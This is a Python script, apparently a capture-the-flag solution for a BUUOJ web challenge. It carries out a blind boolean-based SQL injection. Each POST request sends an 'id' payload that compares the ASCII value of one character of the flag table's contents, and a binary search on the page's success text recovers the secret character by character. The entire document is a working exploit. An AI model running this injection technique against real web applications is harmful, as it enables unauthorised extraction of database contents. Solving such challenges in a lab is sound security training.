import requests
import time

url = "http://3fe2b42b-79d0-4718-9362-bbb308e301eb.node5.buuoj.cn:81/index.php"
result = ""


for i in range(1, 45):
    low = 32
    high = 127
    while low < high:
        mid = (low + high) // 2
        payload = {"id": f"(ascii(substr((select(flag)from(flag)),{i},1))>{mid})"}
        res = requests.post(url, data=payload)
        if "Hello, glzjin wants a girlfriend." in res.text:
            low = mid + 1
        else:
            high = mid
        time.sleep(0.1)
    ascii_value = low
    char = chr(ascii_value)
    result += char
    print(f"第{i}个字符: '{char}' (ASCII: {ascii_value})")
    print(f"当前结果: {result}")
print(f"最终flag: {result}")
print(f"flag长度: {len(result)}")